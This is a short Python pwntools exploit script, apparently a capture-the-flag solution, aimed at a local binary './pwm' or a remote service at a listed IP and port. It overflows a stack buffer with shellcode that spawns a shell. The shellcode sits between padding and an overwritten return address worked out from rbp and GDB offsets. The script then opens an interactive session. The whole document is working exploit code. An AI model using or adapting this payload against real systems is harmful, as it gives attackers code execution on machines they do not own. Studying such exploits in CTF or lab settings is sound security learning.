from pwn import *

local = True
executable = "./pwm"



context.binary = executable

if local:
	r = process(executable)
else:
    r = remote("100.101.159.45", 5003)
    
#address_str = r.recvline().strip()
#address = int(address_str, 16)

#n = 0x6c + 0x4



# not really the size of the array, but the distance it was to rbp 
CHAR_ARRAY_SIZE = 0x120


# in GDB the rbp address is this one, but the dump of the stack given by the program gives 0x7fffffffc880 as rbp
RBP_ADDRESS = 0x7fffffffc7b0
GDB_OFFSET = 208

QUIT_0_SIZE = 5


string_address = RBP_ADDRESS - CHAR_ARRAY_SIZE + GDB_OFFSET + QUIT_0_SIZE

#log.info(address_str)
bindshell = asm(shellcraft.sh())

log.info(bindshell)

n = CHAR_ARRAY_SIZE + 0x08

total = n - len(bindshell) - QUIT_0_SIZE

payload = b'0'*QUIT_0_SIZE + bindshell + b'A'*total + p64(string_address)

log.info(f"Payload is {payload}")

s = r.recvuntil("PWM command (e.g. 'help') [1]: ")

r.sendline(payload)
r.sendline(b"quit")

log.info("Payload sent")

r.interactive()
